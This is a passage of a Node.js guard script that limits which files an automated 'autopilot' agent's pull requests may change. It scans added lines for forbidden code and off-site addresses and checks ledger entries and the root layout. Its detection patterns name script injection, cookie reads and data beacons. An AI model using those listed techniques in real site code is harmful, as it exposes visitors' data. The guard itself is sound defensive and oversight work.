#!/usr/bin/env node
/**
 * What an autopilot pull request may change (docs/AUTOPILOT.md; the rules themselves are autopilot/CONSTITUTION.md).
 *
 *   node scripts/autopilot-guard.cjs --base origin/main --head HEAD [--branch autopilot/2026-10-15-home-hero] [--pr 61] [--json]
 *   node scripts/autopilot-guard.cjs --self-test     temporary git repositories covering every rule, pass and fail
 *
 * It reads the two commits with git alone (merge-base, diff, show, cat-file) and never runs code from the pull request,
 * so the "Autopilot merge" workflow can run main's copy of this file against a pull request's head. The diff is taken
 * from the merge base of --base and --head to --head, which is what the pull request adds.
 *
 * The branch comes from --branch, else GITHUB_HEAD_REF, else the checked-out branch when --head is HEAD. A branch that
 * does not start with autopilot/ passes without checks. --pr is the pull request's number, when known: new ledger
 * lines may then name only it. Exit 0 when there is nothing to report, 1 on any violation, 2 on a usage or git error.
 * --json prints the machine-readable result instead of the list.
 */
'use strict';
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { execFileSync } = require('node:child_process');

/**
 * Paths an autopilot pull request may never add, change, delete or rename. This list is the authoritative copy of
 * autopilot/CONSTITUTION.md §6; only the owner changes it, in a pull request that is not on an autopilot/ branch.
 * `**` matches across folders (and `**` followed by a slash also matches no folder at all), `*` within one path segment.
 * The privacy modules are protected under every extension: webpack resolves .js and .mjs before .tsx and .ts, so a
 * sibling such as lib/analytics.js would otherwise replace lib/analytics.ts in the bundle. Every components/Experiment*
 * file is the experiment framework (Experiment.tsx and ExperimentVariant.tsx, which holds useVariant); the registry,
 * lib/experiments.ts, is not protected.
 */
const PROTECTED = [
  'analysis/**', 'public/data/**', 'data/**', 'docs/evidence/**',
  'lib/analytics.*', 'lib/analytics-policy.*', 'lib/replay-policy.*', 'lib/event-policy.*', 'lib/data-fetch.*', 'lib/experiment-runtime.*', 'lib/chunk-reload.*',
  'components/SiteAnalytics.*', 'components/AnalyticsPreference.*', 'components/PageFeedback.*', 'components/SectionTracker.*', 'components/Experiment*',
  // The root layout renders the analytics and experiment tags, and UnitsProvider wraps them: an edit to either could
  // drop or condition them in production only, which no check before the merge would see.
  'app/layout.*', 'components/UnitsProvider.*',
  'app/privacy/**', 'app/**/error.*', 'app/**/global-error.*', 'app/**/not-found.*',
  'scripts/**', '.github/**', '.claude/**', 'CLAUDE.md', 'AGENTS.md',
  'autopilot/CONSTITUTION.md', 'autopilot/metrics.md',
  '**/package.json', 'package-lock.json', 'next.config.*', 'vercel.json', 'tsconfig.json', '.gitignore', '.npmrc', '.nvmrc', '.node-version',
  'docs/ANALYTICS.md', 'docs/AUTOPILOT.md', 'docs/PROJECT_HANDOFF.md', 'LICENSE*',
];

/**
 * The only places an autopilot pull request may touch at all. Anything else counts as protected too: every file at
 * the root, every dotfile in any folder (.env.production, .babelrc, .postcssrc, .vercelignore) and any new top-level
 * folder, because Next.js and Vercel read such files at build time.
 */
const ALLOWED = ['app/**', 'components/**', 'lib/**', 'hooks/**', 'context/**', 'public/**', 'styles/**', 'docs/**/*.md', 'autopilot/ledger.jsonl', 'autopilot/backlog.md', 'autopilot/LEARNINGS.md'];

/** Written for people, never built into the site: the only files whose added lines are not scanned. */
const PROSE = ['docs/**/*.md', 'autopilot/ledger.jsonl', 'autopilot/backlog.md', 'autopilot/LEARNINGS.md'];
/** A pull request that changes only these (existing ledger lines, the backlog, the learnings) is bookkeeping: it needs no new ledger line. */
const BOOKKEEPING = ['autopilot/ledger.jsonl', 'autopilot/backlog.md', 'autopilot/LEARNINGS.md'];

const BRANCH_PREFIX = 'autopilot/';
const BRANCH_NAME = /^autopilot\/(\d{4}-\d{2}-\d{2})-[a-z0-9]+(-[a-z0-9]+)*$/;
const BRANCH_MAX = 80;
const LIMITS = {
  files: 60, lines: 1500,
  binaryBytes: 600 * 1024, binaryTotalBytes: 2 * 1024 * 1024,
  textBytes: 200 * 1024, textTotalBytes: 1024 * 1024,
  lineLength: 3000, ledgerLines: 10, ledgerDateDays: 2, experimentMaxDays: 42,
  // shipped_on, evaluated_on and an experiment's registry start may be this many days after today (the head commit's
  // UTC day, or the clock's if that is earlier), for clock and time-zone slack.
  ledgerClockDays: 1,
};
const LEDGER = 'autopilot/ledger.jsonl';

/** Page and route handlers (and the metadata routes behind /robots.txt, /sitemap.xml and the manifest): URLs are owner decisions. */
const ROUTE_FILE = /^app\/(?:.+\/)?(?:page|route)\.(?:tsx?|jsx?|mdx?)$|^app\/(?:robots|sitemap|manifest)\.(?:tsx?|jsx?)$/;
/** New JavaScript in site code: it is not type-checked (allowJs is false), and webpack prefers it to a .ts file of the same name. */
const SITE_JS = /^(?:app|components|lib|hooks|context|styles)\/.+\.(?:js|jsx|mjs|cjs)$/;
/**
 * The only binary files an autopilot pull request may add or change: under public/ (not public/data/), and the
 * Next.js metadata images under app/ (favicon.ico, icon, apple-icon, opengraph-image and twitter-image files). Every
 * other file must be UTF-8 text, and is scanned.
 */
const MEDIA_TYPES = ['png', 'jpg', 'jpeg', 'webp', 'avif', 'gif', 'ico', 'woff', 'woff2', 'ttf', 'otf', 'pdf', 'mp4', 'webm'];
const MEDIA = new RegExp(`\\.(?:${MEDIA_TYPES.join('|')})$`, 'i');
const METADATA_IMAGE = /^app\/(?:.+\/)?(?:favicon\.ico|(?:icon|apple-icon|opengraph-image|twitter-image)\d*\.(?:png|jpe?g|gif|ico))$/;
const binaryAllowedAt = (file) => (file.startsWith('public/') && !file.startsWith('public/data/')) || METADATA_IMAGE.test(file);
const SCRIPT_FILE = /\.(?:[cm]?[jt]sx?)$/i;
const MARKUP_FILE = /\.(?:html?|svg|xml)$/i;

// An absolute or protocol-relative address right after an opening quote: "https://…", '//…', `http://…`.
const EXTERNAL = String.raw`[\x60'"]\s*(?:https?:)?\/\/`;
const EXTERNAL_BARE = String.raw`[\x60'"]?\s*(?:https?:)?\/\/`;

/**
 * Code that could run third-party code, write browser storage, send data off the site, load something from another
 * host (external images, fonts and media reveal visitors' IP addresses) or show error UI. Each rule is
 * [name, pattern, pattern for .js/.ts files]: in script files tags are matched case-sensitively, so React components
 * such as <Link>, <Frame> or <Embed> are not mistaken for <link>, <frame> or <embed>.
 */
const FORBIDDEN = [
  ['<script', /<script\b/i, /<script\b/],
  ['next/script', /next\/script/i],
  ['dangerouslySetInnerHTML', /dangerouslySetInnerHTML/i],
  ['HTML injection (innerHTML, outerHTML, insertAdjacentHTML, document.write)', /\b(?:inner|outer)HTML\s*=|insertAdjacentHTML|document\s*\.\s*write/],
  ['eval(', /\beval\s*\(/],
  ['new Function(', /\bFunction\s*\(/],
  ['document.cookie', /document\s*(?:\.\s*cookie|\[\s*[\x60'"]cookie)|\bcookieStore\b/],
  ['browser storage (localStorage, sessionStorage, indexedDB)', /localStorage|sessionStorage|indexedDB/i],
  ['navigator.sendBeacon', /sendBeacon/i],
  ['XMLHttpRequest', /XMLHttpRequest/i],
  ['new WebSocket', /\bWebSocket\b/],
  ['EventSource(', /\bEventSource\b/],
  ['PostHog', /posthog/i],
  // In script files <object is a tag only when no type punctuation follows it (Array<object>, Map<object, …>).
  ['<iframe, <embed or <object', /<(?:iframe|frame|embed|object)\b/i, /<(?:iframe|frame|embed)\b|<object\b(?!\s*[,|&>)\]])/],
  ['<base', /<base\b/i, /<base\b/],
  // In script files only an address (after a quote, "(" or "="), so copy such as "needs JavaScript: …" is fine.
  ['javascript: URL', /javascript:/i, /[\x60'"(=]\s*javascript\s*:/i],
  ['fetch( of an absolute URL', new RegExp(String.raw`\b(?:fetch|Request)\s*\(\s*(?:new\s+URL\s*\(\s*)?${EXTERNAL}`, 'i')],
  ['import( of an http(s) URL', new RegExp(String.raw`\bimport\s*\(\s*(?:\/\*[\s\S]*?\*\/\s*)?${EXTERNAL}|\bfrom\s+${EXTERNAL}`, 'i')],
  ['src=/srcSet= of an absolute URL', new RegExp(String.raw`\b(?:src|poster|action|formaction|ping|background)\s*=\s*\{?\s*${EXTERNAL}|\b(?:image)?srcset\s*=\s*\{?\s*[\x60'"][^\x60'"]*?(?:https?:)?\/\/`, 'i')],
  // Lower case in script files, so the URL constructor is left to the address scan below (which knows the site's own host).
  ['url( of an absolute URL', new RegExp(String.raw`\burl\s*\(\s*${EXTERNAL_BARE}`, 'i'), new RegExp(String.raw`\burl\s*\(\s*${EXTERNAL_BARE}`)],
  ['@import of an http(s) URL', new RegExp(String.raw`@import\s+(?:url\s*\(\s*)?${EXTERNAL_BARE}`, 'i')],
  ['<link>/<image>/<use> of an absolute URL', new RegExp(String.raw`<(?:link|image|use|feimage)\b[^>]*\b(?:xlink:)?href\s*=\s*\{?\s*${EXTERNAL}`, 'i'), new RegExp(String.raw`<(?:link|image|use|feImage)\b[^>]*\b(?:xlink:)?href\s*=\s*\{?\s*${EXTERNAL}`)],
  ['RTCPeerConnection / WebTransport', /RTCPeerConnection|WebTransport/],
  ['service worker', /serviceWorker|importScripts/],
  ['a custom error boundary (error pages are the owner\'s; app/**/error.tsx is protected)', /\b(?:getDerivedStateFromError|componentDidCatch)\b/],
];
/** In HTML and SVG files only: inline event handlers run script without a <script> tag. */
const FORBIDDEN_MARKUP = [['inline event handler (onload=, onerror=, …)', /\bon[a-z]+\s*=/i]];

/**
 * Hosts an added address may name outside a link: the site itself, and identifiers that are never fetched
 * (the citation DOI, JSON-LD and SVG namespaces, the owner's repositories). An entry with a path matches that prefix.
 */
const URL_ALLOWED = ['splithappens.run', 'www.splithappens.run', 'doi.org', 'schema.org', 'www.w3.org', 'www.sitemaps.org', 'github.com/koolkam00/'];
// An address in code: after a quote, a space, a comma, "(" or "="; protocol-relative ones only right after a quote, "(" or "=".
const URL_IN_CODE = /(^|[\x60'"\s,(=])((?:https?:)?\/\/)([a-z0-9](?:[a-z0-9-]*[a-z0-9])?(?:\.[a-z0-9](?:[a-z0-9-]*[a-z0-9])?)*\.[a-z]{2,})(?::\d+)?(\/[^\s\x60'")]*)?/gi;
// Where an address is a destination or an identifier rather than something the page loads: href= (an <a> or a
// next/link <Link>); an href, url or link field of a list of links; the JSON-LD identifier fields license, sameAs,
// citation and @id; an XML namespace (xmlns:inkscape="http://…"). <link>, <use> and <image> hrefs have their own rule above.
const LINK_CONTEXT = /(?:\bhref\s*=\s*\{?\s*|\bxmlns(?::[\w-]+)?\s*=\s*|\b(?:href|url|link|license|sameAs|citation)\s*:\s*|[\x60'"]@id[\x60'"]\s*:\s*)$/i;
// An address whose host is computed (`https://${host}/…`, 'https://' + host): the address scan cannot read the host.
const COMPUTED_HOST = /([\x60'"])\s*(?:https?:)?\/\/(?:\$\{|\1\s*\+)/g;

/** Wording the site never uses (autopilot/CONSTITUTION.md §3), and release identifiers that never appear in visible copy. */
const BANNED = [
  ['"arithmetic"', /arithmetic/i],
  ['"the wall" (say "sustained slowdown")', /\bthe\s+wall\b(?![\s-]*clock)/i],
  ['"hit the wall"', /\bhit(s|ting)?\s+the\s+wall\b/i],
  ['"your chance" (shares are observed, never a chance)', /your\s+chance/i],
  // The tag itself; the prefix alone is how the data loaders check a release (release.tag.replace('private-export-', …)).
  ['"private-export-…" (release tags stay out of copy)', /private-export-\d/i],
  ['"20260912" (release tags stay out of copy)', /20260912/],
  ['"htw-db-…" (release tags stay out of copy)', /htw-db-\d/i],
  ['"20261016" (release tags stay out of copy)', /20261016/],
  ['"20261021" (release tags stay out of copy)', /20261021/],
];

const LEDGER_REQUIRED = ['id', 'date', 'kind', 'title', 'hypothesis', 'primary_metric', 'guardrails', 'baseline', 'decision_rule', 'evaluate_after', 'status', 'pr', 'verdict', 'result'];
const LEDGER_MUTABLE = new Set(['status', 'verdict', 'result', 'evaluated_on', 'pr', 'shipped_on', 'notes']);
/** Fields that may be filled in once (from null or absent) and are then fixed, so a recorded outcome cannot be rewritten. */
const LEDGER_SET_ONCE = ['verdict', 'result', 'evaluated_on', 'pr', 'shipped_on'];
const LEDGER_KINDS = ['change', 'experiment', 'conclude', 'revert', 'fix'];
const LEDGER_STATUSES = ['proposed', 'shipped', 'reverted', 'concluded'];
/** How an entry's status may move; it never moves back. (proposed to concluded: marked shipped and judged in one pull request.) */
const LEDGER_NEXT = { proposed: ['shipped', 'concluded', 'reverted'], shipped: ['concluded', 'reverted'], concluded: ['reverted'], reverted: [] };
const LEDGER_VERDICTS = ['keep', 'revert', 'inconclusive', 'iterate', 'ship-variant', 'keep-control'];
/** The verdicts each kind can reach (autopilot/metrics.md §3); "revert" is in every set, since anything shipped can be rolled back. */
const LEDGER_KIND_VERDICTS = {
  change: ['keep', 'revert', 'inconclusive', 'iterate'],
  experiment: ['ship-variant', 'keep-control', 'inconclusive', 'revert'],
  fix: ['keep', 'revert', 'inconclusive'],
  revert: ['keep', 'revert', 'inconclusive'],
  conclude: ['keep', 'revert', 'inconclusive'],
};
const LEDGER_ID = /^\d{4}-\d{2}-\d{2}-[a-z0-9-]+$/;
/** The registered metrics: a new entry's primary_metric and guardrails are names from the §1 Definitions table, `name@vN`. */
const METRICS = 'autopilot/metrics.md';
const METRIC_NAME = /^[a-z][a-z0-9_]*@v\d+$/;
/**
 * Kinds that are judged later, on a sample (an experiment's arms, a change's before/after windows) and against their
 * guardrails, so they register a measured baseline, a minimum sample, their windows and at least one guardrail.
 */
const JUDGED_KINDS = ['change', 'experiment'];
/** A change's before/after windows, in full days (autopilot/metrics.md §3: "the 14 (or 28) full days"). */
const WINDOW_DAYS = [14, 28];
/** An experiment's registry key, and its pages: canonical site paths ("/", "/tools") or "*" for every page. */
const EXPERIMENT_KEY = /^[a-z0-9]+(?:-[a-z0-9]+)*$/;
const EXPERIMENT_PAGE = /^(?:\*|\/(?:[a-z0-9_-]+(?:\/[a-z0-9_-]+)*)?)$/;

// ---------- Small helpers ----------

function globRegex(glob) {
  let source = '';
  for (let i = 0; i < glob.length; i += 1) {
    if (glob.startsWith('**/', i)) { source += '(?:[^/]+/)*'; i += 2; }
    else if (glob.startsWith('**', i)) { source += '.*'; i += 1; }
    else if (glob[i] === '*') source += '[^/]*';
    else source += glob[i].replace(/[.+?^${}()|[\]\\]/g, '\\$&');
  }
  return new RegExp(`^${source}$`);
}
const compile = (globs) => globs.map((glob) => [glob, globRegex(glob)]);
const PROTECTED_RE = compile(PROTECTED);
const ALLOWED_RE = compile(ALLOWED);
const PROSE_RE = compile(PROSE);
const matching = (list, file) => (list.find(([, re]) => re.test(file)) || [])[0] || null;
/** Why a path is off limits ("lib/analytics.* is protected"), or null. */
function protectedBy(file) {
  // The guard inspects this exact data module; alternate extensions/directory indexes can shadow it.
  if (file !== 'lib/experiments.ts' && /^lib\/experiments(?:[./]|$)/.test(file)) return 'experiment registry aliases are protected; use only lib/experiments.ts';
  const glob = matching(PROTECTED_RE, file);
  if (glob) return `${glob} is protected`;
  if (file.split('/').some((segment) => segment.startsWith('.'))) return 'dotfiles are protected';
  if (!matching(ALLOWED_RE, file)) return `outside the folders an autopilot pull request may change (${ALLOWED.join(', ')})`;
  return null;
}
const isProse = (file) => Boolean(matching(PROSE_RE, file));

function validDate(value) {
  if (typeof value !== 'string' || !/^\d{4}-\d{2}-\d{2}$/.test(value)) return false;
  const date = new Date(`${value}T00:00:00Z`);
  return Number.isFinite(date.getTime()) && date.toISOString().slice(0, 10) === value;
}
const isObject = (value) => value !== null && typeof value === 'object' && !Array.isArray(value);
const sameJson = (a, b) => JSON.stringify(sortKeys(a)) === JSON.stringify(sortKeys(b));
function sortKeys(value) {
  if (Array.isArray(value)) return value.map(sortKeys);
  if (isObject(value)) return Object.fromEntries(Object.keys(value).sort().map((key) => [key, sortKeys(value[key])]));
  return value;
}
const brief = (value) => { const text = JSON.stringify(value); return text.length > 40 ? `${text.slice(0, 40)}…` : text; };

class GitError extends Error {}
function git(cwd, args, { buffer = false, allowFail = false } = {}) {
  try {
    return execFileSync('git', ['--no-pager', '--literal-pathspecs', '-c', 'core.quotePath=false', ...args], {
      cwd, encoding: buffer ? null : 'utf8', maxBuffer: 512 * 1024 * 1024, stdio: ['ignore', 'pipe', 'pipe'],
    });
  } catch (error) {
    if (allowFail) return null;
    const stderr = error.stderr ? String(error.stderr).trim() : '';
    throw new GitError(`git ${args.join(' ')} failed: ${stderr.split('\n')[0] || `exit status ${error.status}`}`);
  }
}

// ---------- Reading the change ----------

/** Every changed path between two commits: `git diff --raw -z -M` with full blob ids and modes. */
function changedEntries(cwd, from, to) {
  const tokens = git(cwd, ['diff', '--raw', '-z', '-M', '--no-abbrev', '--no-ext-diff', '--no-textconv', from, to]).split('\0');
  const entries = [];
  for (let i = 0; i < tokens.length; i += 1) {
    const meta = tokens[i];
    if (!meta.startsWith(':')) continue;
    const [oldMode, newMode, oldSha, newSha, statusField] = meta.slice(1).split(' ');
    const status = statusField[0];
    const oldPath = tokens[i + 1];
    const twoPaths = status === 'R' || status === 'C';
    const newPath = twoPaths ? tokens[i + 2] : oldPath;
    i += twoPaths ? 2 : 1;
    entries.push({
      status, oldMode, newMode, oldSha, newSha,
      oldPath: status === 'A' ? null : oldPath,
      newPath: status === 'D' ? null : newPath,
    });
  }
  return entries;
}

const ZERO_SHA = /^0+$/;
function blob(cwd, sha) { return ZERO_SHA.test(sha) ? null : git(cwd, ['cat-file', 'blob', sha], { buffer: true }); }
const UTF8 = new TextDecoder('utf-8', { fatal: true });
/** Text means UTF-8 with no NUL byte. Decided here, not by git, so a .gitattributes file cannot hide a text change. */
function isText(buffer) {
  if (!buffer || buffer.includes(0)) return false;
  try { UTF8.decode(buffer); return true; } catch { return false; }
}

/** Added lines (with their line numbers in the new file) and the deleted lines of one text change. */
function textChange(cwd, from, to, entry) {
  const paths = [...new Set([entry.oldPath, entry.newPath].filter(Boolean))];
  const patch = git(cwd, ['diff', '--text', '-U0', '--no-color', '--no-ext-diff', '--no-textconv', '-M', from, to, '--', ...paths]);
  const added = [];
  const deleted = [];
  let inHunk = false;
  let next = 0;
  for (const line of patch.split('\n')) {
    if (line.startsWith('diff --git ')) { inHunk = false; continue; }
    const hunk = /^@@ -\d+(?:,\d+)? \+(\d+)(?:,\d+)? @@/.exec(line);
    if (hunk) { inHunk = true; next = Number(hunk[1]); continue; }
    if (!inHunk) continue;
    if (line.startsWith('+')) { added.push({ line: next, text: line.slice(1) }); next += 1; }
    else if (line.startsWith('-')) deleted.push(line.slice(1));
  }
  return { added, deleted };
}
const allLines = (text) => text.split('\n').map((line, index) => ({ line: index + 1, text: line }));

/** Consecutive added lines joined into blocks, so a JSX tag or call split over several lines is scanned as one. */
function addedBlocks(added) {
  const blocks = [];
  for (const item of added) {
    const last = blocks[blocks.length - 1];
    if (last && item.line === last.lines[last.lines.length - 1] + 1) { last.lines.push(item.line); last.texts.push(item.text); }
    else blocks.push({ lines: [item.line], texts: [item.text] });
  }
  return blocks.map((block) => ({ ...block, text: block.texts.join('\n') }));
}
function lineAt(block, offset) {
  let seen = 0;
  for (let i = 0; i < block.texts.length; i += 1) {
    seen += block.texts[i].length + 1;
    if (offset < seen) return block.lines[i];
  }
  return block.lines[block.lines.length - 1];
}
/** True when every line a match spans is a line moved here unchanged from elsewhere in the change (see check()). */
function movedMatch(block, match, moved) {
  if (!moved.size) return false;
  const first = lineAt(block, match.index);
  const last = lineAt(block, match.index + Math.max(0, match[0].length - 1));
  return block.lines.filter((line) => line >= first && line <= last).every((line) => moved.has(line));
}
function scan(file, blocks, rules, rule, violations, moved = new Set()) {
  const reported = new Set();
  const script = SCRIPT_FILE.test(file);
  for (const block of blocks) {
    for (const [name, pattern, scriptPattern] of rules) {
      const chosen = script && scriptPattern ? scriptPattern : pattern;
      const global = new RegExp(chosen.source, chosen.flags.includes('g') ? chosen.flags : `${chosen.flags}g`);
      for (const match of block.text.matchAll(global)) {
        if (movedMatch(block, match, moved)) continue;
        const line = lineAt(block, match.index);
        const key = `${name}:${line}`;
        if (reported.has(key)) continue;
        reported.add(key);
        violations.push({ rule, file, line, message: `${name}: "${match[0].replace(/\s+/g, ' ').slice(0, 60)}"` });
      }
    }
  }
}

/** Is position `at` inside a quoted string on its line? An odd number of one kind of quote before it says so. */
const inString = (text, at) => {
  const before = text.slice(text.lastIndexOf('\n', at - 1) + 1, at);
  return ["'", '"', '`'].some((quote) => before.split(quote).length % 2 === 0);
};
const blank = (text) => text.replace(/[^\n]/g, ' ');
/**
 * Comments blanked out (same length, so offsets still map to lines): addresses in comments are notes, not loads. A
 * comment marker inside a string ('/*', ' //') is code, and a line inside a JSDoc comment whose opening line is not
 * part of the change (" * see https://…") is still a comment.
 */
const blankComments = (text) => text
  .replace(/\/\*[\s\S]*?\*\/|<!--[\s\S]*?-->/g, (comment, at, all) => (inString(all, at) ? comment : blank(comment)))
  .replace(/(^|[\s;{}])(\/\/.*)$/gm, (match, before, comment, at, all) => (inString(all, at + before.length) ? match : before + blank(comment)))
  .replace(/^(\s*)(\*(?:\s(?:(?!\*\/).)*)?)(?=\*\/|$)/gm, (match, indent, comment) => indent + blank(comment));

function urlAllowed(host, rest) {
  // Compared with a trailing slash, so github.com/koolkam00 matches the entry github.com/koolkam00/ (and github.com/koolkam00x does not).
  const target = `${host.toLowerCase()}${rest || '/'}/`;
  return URL_ALLOWED.some((entry) => (entry.includes('/') ? target.startsWith(entry) : host.toLowerCase() === entry));
}
const linkContext = (text, at) => LINK_CONTEXT.test(text.slice(Math.max(0, at - 60), at));
/** Added addresses on another host, wherever they are (constants, data, srcset lists, templates), unless they are a link's destination. */
function scanUrls(file, blocks, violations, moved = new Set()) {
  const reported = new Set();
  const report = (block, match, host, message) => {
    if (movedMatch(block, match, moved)) return;
    const line = lineAt(block, match.index);
    const key = `${host}:${line}`;
    if (reported.has(key)) return;
    reported.add(key);
    violations.push({ rule: 'forbidden-pattern', file, line, message });
  };
  for (const block of blocks) {
    const text = blankComments(block.text);
    for (const match of text.matchAll(URL_IN_CODE)) {
      const [, before, scheme, host, rest] = match;
      const quote = /[\x60'"]/.test(before);
      if (scheme === '//' && !(quote || before === '(' || before === '=')) continue;
      if (quote && linkContext(text, match.index)) continue;
      if (urlAllowed(host, rest)) continue;
      report(block, match, host, `an address on another host (${host}) outside a link: pages may not load anything from another host (it reveals visitors' IP addresses); a link's address goes in href= or in a url/href/link field`);
    }
    for (const match of text.matchAll(COMPUTED_HOST)) {
      if (linkContext(text, match.index)) continue;
      report(block, match, '(computed)', `an address whose host is computed ("${match[0].trim().slice(0, 30)}") outside a link: the guard cannot tell which host it loads from; write the address out in full`);
    }
  }
}

const showFile = (cwd, commit, file) => {
  const out = git(cwd, ['show', `${commit}:${file}`], { buffer: true, allowFail: true });
  return out === null ? null : out.toString('utf8');
};
/** JSX and JavaScript comments removed, so a commented-out <SiteAnalytics /> does not count as present. */
const withoutComments = (source) => source
  .replace(/\{\s*\/\*[\s\S]*?\*\/\s*\}/g, ' ')
  .replace(/\/\*[\s\S]*?\*\//g, ' ')
  .replace(/(^|[\s;{}])\/\/.*$/gm, '$1');
// ---------- The root layout's required tags ----------

/**
 * Tags app/layout.tsx must render where main does: SiteAnalytics always, ExperimentHead once main renders it. A
 * condition of any kind cannot be allowed around them, not only an always-false one: Vercel sets VERCEL_ENV per
 * deployment, so `{process.env.VERCEL_ENV !== 'production' && <SiteAnalytics />}` keeps analytics in the privacy build
 * and the preview, which every check before the merge sees, and removes it from production.
 */
const LAYOUT_TAGS = ['SiteAnalytics', 'ExperimentHead'];
const JSX_NAME = /[A-Za-z_$][\w$.:-]*/y;

/** Index just after the string or template literal that starts at i. */
function skipQuoted(src, i) {
  const quote = src[i];
  let j = i + 1;
  while (j < src.length) {
    if (src[j] === '\\') j += 2;
    else if (quote === '`' && src[j] === '$' && src[j + 1] === '{') j = skipCode(src, j + 2, '}');
    else if (src[j] === quote) return j + 1;
    else j += 1;
  }
  throw new Error('a string is not closed');
}
/** Does the `<` at i start JSX? Only after an operator, an opening bracket or `return`; after a name it is a comparison or a type. */
function jsxAt(src, i) {
  if (!/[A-Za-z_$>]/.test(src[i + 1] || '')) return false;
  let j = i - 1;
  while (j >= 0 && /\s/.test(src[j])) j -= 1;
  return j < 0 || /[(,=?:&|{[!;]/.test(src[j]) || (src[j] === '>' && src[j - 1] === '=') || /\breturn$/.test(src.slice(Math.max(0, j - 6), j + 1));
}
/** Index just after the code that starts at i and ends with `close`, past nested brackets, strings and JSX. */
function skipCode(src, i, close) {
  const open = [close];
  for (let j = i; j < src.length; j += 1) {
    const c = src[j];
    if (c === '"' || c === "'" || c === '`') j = skipQuoted(src, j) - 1;
    else if (c === '(') open.push(')');
    else if (c === '[') open.push(']');
    else if (c === '{') open.push('}');
    else if (c === ')' || c === ']' || c === '}') {
      if (open.pop() !== c) throw new Error(`an unexpected "${c}"`);
      if (!open.length) return j + 1;
    } else if (c === '<' && jsxAt(src, j)) j = readJsx(src, j).end - 1;
  }
  throw new Error(`a "${close}" is missing`);
}
/**
 * The JSX element that starts at i: its name ('' for a fragment), where it ends, and its plain children, the elements
 * written directly inside it. An element inside a {…} expression (after &&, ||, ??, in a ternary, a map, anything)
 * or an attribute is skipped, so it is never a plain child.
 */
function readJsx(src, i) {
  JSX_NAME.lastIndex = i + 1;
  const named = JSX_NAME.exec(src);
  const name = named ? named[0] : '';
  let j = i + 1 + name.length;
  for (;;) {
    if (j >= src.length) throw new Error(`<${name}> is not closed`);
    const c = src[j];
    if (c === '/' && src[j + 1] === '>') return { name, start: i, end: j + 2, children: [] };
    if (c === '>') { j += 1; break; }
    if (c === '"' || c === "'") j = skipQuoted(src, j);
    else if (c === '{') j = skipCode(src, j + 1, '}');
    else j += 1;
  }
  const children = [];
  for (;;) {
    if (j >= src.length) throw new Error(`<${name}> has no closing tag`);
    if (src[j] === '{') { j = skipCode(src, j + 1, '}'); continue; }
    if (src[j] !== '<') { j += 1; continue; }
    if (src[j + 1] === '/') {
      const closing = /^<\/\s*([A-Za-z_$][\w$.:-]*)?\s*>/.exec(src.slice(j, j + 200));
      if (!closing || (closing[1] || '') !== name) throw new Error(`<${name}> is closed by ${closing ? closing[0] : 'something else'}`);
      return { name, start: i, end: j + closing[0].length, children };
    }
    const child = readJsx(src, j);
    children.push(child);
    j = child.end;
  }
}

/**
 * What the root layout renders unconditionally, read from its source without running it. The default export must be
 * a function that returns one JSX element (as main's does, `return (<html …>…</html>);`), so an early return or a
 * conditional root cannot hide a tag; `preamble` is the code before that return, which must stay as main has it. For
 * each tag in LAYOUT_TAGS: the plain chain of elements from the root to it (null when it is only inside an expression,
 * a comment or a function other than the default export), its own source text, and the module it is imported from.
 * Components the layout defines itself are listed, since one of them around a tag could render nothing in production.
 */
function readLayout(source) {
  const src = withoutComments(source);
  const shape = { problem: null, preamble: null, tags: {}, imports: {}, local: new Set() };
  for (const match of src.matchAll(/\b(?:function|class|const|let|var)\s+([A-Za-z_$][\w$]*)/g)) shape.local.add(match[1]);
  for (const tag of LAYOUT_TAGS) {
    shape.tags[tag] = null;
    const imported = new RegExp(`^\\s*import\\b[^;]*?(?<![\\w$])${tag}(?![\\w$])[^;]*?from\\s*(['"])([^'"]+)\\1`, 'm').exec(src);
    shape.imports[tag] = imported && !new RegExp(`\\bas\\s+${tag}\\b`).test(imported[0]) ? imported[2] : null;
  }
  try {
    const exported = /\bexport\s+default\s+(?:async\s+)?function\s*[A-Za-z_$]*\s*\(/.exec(src);
    if (!exported) throw new Error('its default export is not a function declaration');
    const afterParams = skipCode(src, exported.index + exported[0].length, ')');
    const opening = /^\s*(?::[^{=]*)?\{/.exec(src.slice(afterParams));
    if (!opening) throw new Error("its default export's body could not be read");
    const bodyStart = afterParams + opening[0].length;
    const body = src.slice(bodyStart, skipCode(src, bodyStart, '}') - 1);
    const returned = /\breturn\s*(\(\s*)?</.exec(body);
    if (!returned) throw new Error('its default export does not return a JSX element directly (return (<html …>…</html>))');
    shape.preamble = body.slice(0, returned.index).replace(/\s+/g, ' ').trim();
    const root = readJsx(body, returned.index + returned[0].length - 1);
    if (!new RegExp(`^\\s*${returned[1] ? '\\)' : ''}\\s*;?\\s*$`).test(body.slice(root.end))) throw new Error('its default export returns more than one JSX element, or something after it');
    const walk = (element, chain) => {
      for (const child of element.children) {
        if (LAYOUT_TAGS.includes(child.name) && !shape.tags[child.name]) shape.tags[child.name] = { chain, text: body.slice(child.start, child.end).replace(/\s+/g, ' ') };
        walk(child, [...chain, child.name || '<>']);
      }
    };
    walk({ children: [root] }, []);
  } catch (error) {
    shape.problem = error.message;
  }
  return shape;
}

/**
 * The required tags, judged against main's layout. Each must be a plain element of the default export's JSX, inside
 * the same chain of elements as on main (no new wrapper, defined here or in another file), written as on main,
 * imported from the same module, and neither it nor a component around it may be defined in the layout itself.
 */
function layoutProblems(layout, layoutBefore) {
  const after = readLayout(layout);
  const before = layoutBefore === null ? null : readLayout(layoutBefore);
  const problems = [];
  if (after.problem) problems.push(`could not be read as a root layout (${after.problem}); the default export returns its <html> element directly, as on main`);
  else if (before && !before.problem && before.preamble !== after.preamble) problems.push('changes the code before the default export\'s return; it stays as on main, so nothing before the return can choose what the layout renders');
  for (const tag of LAYOUT_TAGS) {
    const was = before && before.tags[tag];
    if (tag !== 'SiteAnalytics' && !was) continue;
    const now = after.tags[tag];
    const where = (placed) => placed.chain.map((name) => `<${name === '<>' ? '' : name}>`).join(' ');
    if (!now) { problems.push(`must still render <${tag} /> as a plain element of the default export's JSX, outside comments, {…} expressions (&&, ||, ??, ? :) and other functions`); continue; }
    if (was && where(was) !== where(now)) problems.push(`must still render <${tag} /> exactly where main does (inside ${where(was)}), not inside ${where(now)}: a new wrapper could render nothing in production`);
    else if (was && was.text !== now.text) problems.push(`must still render <${tag} /> written as on main (${was.text}), not ${now.text}`);
    const defined = [tag, ...now.chain.filter((name) => /^[A-Z]/.test(name))].filter((name) => after.local.has(name));
